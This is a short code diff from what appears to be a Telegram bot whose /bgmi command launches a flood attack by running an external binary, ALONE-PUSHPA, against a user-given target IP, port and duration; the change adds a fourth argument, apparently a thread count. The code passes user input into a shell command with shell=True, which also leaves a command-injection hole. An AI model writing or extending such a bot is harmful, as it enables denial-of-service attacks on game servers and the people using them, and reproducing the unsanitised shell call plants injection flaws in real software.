@@ -147,7 +147,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                subprocess.run(f"./ALONE-PUSHPA {target} {port} {time}", shell=True)
+                subprocess.run(f"./ALONE-PUSHPA {target} {port} {time} 900", shell=True)
                 response = f"🅱🅶🅼🅸 🅺🅸 🅲🅷🆄🅳🅰🆈🅸 🅺🅷🅰🆃🅰🅼. 𝐭𝐚𝐫𝐠𝐞𝐭: {target} 𝐩𝐨𝐫𝐭: {port} 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧: {time}"
             bot.reply_to(message, response)
         else:
